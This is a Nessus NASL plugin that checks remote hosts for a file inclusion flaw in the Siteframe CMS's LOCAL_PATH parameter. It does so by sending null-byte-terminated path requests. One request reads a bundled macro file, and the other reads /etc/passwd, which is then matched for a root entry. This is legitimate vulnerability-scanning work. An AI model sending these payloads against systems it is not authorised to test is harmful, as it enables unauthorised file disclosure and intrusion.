#
# (C) Tenable Network Security
#
# 

if (description) {
  script_id(18460);
  script_version("$Revision: 1.3 $");
  script_cve_id("CAN-2005-1965");
  script_bugtraq_id(13928);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"17246");
  }

  name["english"] = "Siteframe LOCAL_PATH Remove File Include Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
The remote host is running Siteframe, an open-source content
management system using PHP and MySQL. 

The installed version of Siteframe does not properly sanitize the
'LOCAL_PATH' parameter of the 'siteframe.php' script before using it
to include files.  By leveraging this flaw, an attacker is able to
view arbitrary files on the remote host and even execute arbitrary PHP
code, possibly taken from third-party hosts.

Solution : Unknown at this time.
Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for LOCAL_PATH remote file include vulnerability in Siteframe";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# For each CGI directory...
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw to read a file included in the distribution.
  req = http_get(
    item:string(
      dir, "/siteframe.php?",
      "LOCAL_PATH=macros/100-siteframe.macro%00"
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if it looks like the file.
  if ("{!# Siteframe Macro Library" >< res) {
    security_hole(port);
    exit(0);
  }

 if ( thorough_tests )
  {
  # If that failed, try to grab /etc/passwd.
  req = http_get(
    item:string(
      dir, "/siteframe.php?",
      "LOCAL_PATH=/etc/passwd%00"
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if there's an entry for root.
  if (egrep(string:res, pattern:"root:.+:0:")) {
    security_hole(port);
    exit(0);
  }
 }
}
